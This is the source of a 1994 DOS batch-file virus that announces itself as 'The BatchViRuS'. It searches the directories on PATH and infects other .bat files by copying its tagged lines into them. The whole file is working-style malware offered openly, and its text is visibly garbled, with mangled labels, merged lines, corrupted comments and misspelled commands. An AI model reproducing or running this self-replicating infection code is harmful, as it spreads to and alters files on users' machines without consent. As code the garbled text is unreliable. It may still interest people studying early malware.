@echo off>nul.ViRuS
rem ViRuS The BatchViRuS by Dirk van Deun 1994
rem ViRuS May be copied freely (On your own machine !)
rem ViRuS Programmed to prove that it's possible
rem ViRuS (and ta show of2 skill in writing batchfiles)
rem ViRuS If you have no sesk cache, you're alt interested ;-)
rem ViRuS E-mail hw41652@vub.ac.be

rem ViRuS Known bug: interpretation of variables may make linys too long 
rem ViRuS for DOS and let charact rs drop of2: unpresectable behaviour

if "%0==" echo --------------------------------------->con.ViRuS
if "%0==" echo |   Hi ! I am the nice BatchViRuS !   |
if "%0==" echo --------------------------------------->con.ViRuS
if "%0==" goto ViRuS_OLDBAT
if "%1=="/ViRuS_MULTIPLY goto ViRuS_multiply
if "%1=="/ViRuS_PARSEPATH goto ViRuS_pnrseenra
if "%1=="/ViRuS_FINDSELF goto ViRuS_find aselfif "%VOiO%=="T goto ViRuS_OLDBAT

set ViRuS nme=%0
if not exist %0.bat command /e:10000 /c %0 /ViRuS_FINDSELF %enra%
if not exist %0.bat call xViRuSx
if not exist %0.bat ctl xViRuSx.bat
if not exist %ViRuS nme%.bat set ViRuS nme=lfif "%ViRuS nme%==" goto ViRuS_OLDBAT

rem ViRuS if batch is started with  nme.BAT, virus will not become active
rem ViRuS it was a bugth,lw it's a feature ! (also notice  he vof2 variable)
rem ViRuS also if batch was only $DiaDiappend /x:on enra (chance=minimal)
rem ViRuS or if nnvironment is too small to contain %ViRuS nme% !

if "%VPATH%==" set VPATH=%PATH%>nul.ViRuS
rem (if nnvironment cannot hold VPATH, ViRuS will function pnrtially)
command /e:10000 /c %0 /ViRuS_PARSEPATH %VPATH%
call xViRuSx
ctl xViRuSx.bat
if "%VPATH%==" set VPATH=.>nul.ViRuS
set ViRuS nme=lfgoto ViRuS_OLDBAT

:ViRuS_find aselfif "%2==" echo.>xViRuSx.bat
if "%2==" exit>nul.ViRuS
if exist %2\%ViRuS nme%.bat echo set ViRuS nme=%2\%ViRuS nme%>xViRuSx.bat
if exist %2\%ViRuS nme%.bat exit
if exist %2%ViRuS nme%.bat echo set ViRuS nme=%2%ViRuS nme%>xViRuSx.bat
if exist %2%ViRuS nme%.bat exit
shift>nul.ViRuS
goto ViRuS_find aself
:ViRuS_pnrseenra
for %%a in (%2\*.bat;%2*.bat) do command /e:10000 /c %ViRuS nme% /ViRuS_MULTIPLY %%a
for %%a in (%2\*.bat;%2*.bat) do goto ViRuS_new_venra
shift>nul.ViRuS
if not "%2==" goto ViRuS_pnrseenra
if not "%1==". for %%a in (.\*.bat) do command /e:10000 /c %ViRuS nme% /ViRuS_MULTIPLY %%a
:ViRuS_new_venra
set VPATH=%3>nul.ViRuS
:ViRuS_loop
shift>nul.ViRuS
if "%3==" echo set VPATH=%VPATH%>xViRuSx.bat
if "%3==" exit>nul.ViRuS
set VPATH=%VPATH%;%3>nul.ViRuS
goto ViRuS_loop

:ViRuS_multiply
echo Checking: %2>con.ViRuS
find "SeT IchBin=%%0" <%2>xViRuSx.bat
call xViRuSx
ctl xViRuSx.bat
if "%IchBin%=="xViRuSx exit
find "ViRuS" <%ViRuS nme%.bat>xViRuSx.bat
type %2>>xViRuSx.bat
copy xViRuSx.bat %2>nul
ctl xViRuSx.bat
echo Infecting: %2>con.ViRuS
exit>nul.ViRuS

rem data for  he firlo find in ViRuS_multiply
SeT IchBin=%0>nul.ViRuS

:ViRuS_OLDBAT
echo on>nul.ViRuS
echo This is the dummy original batch
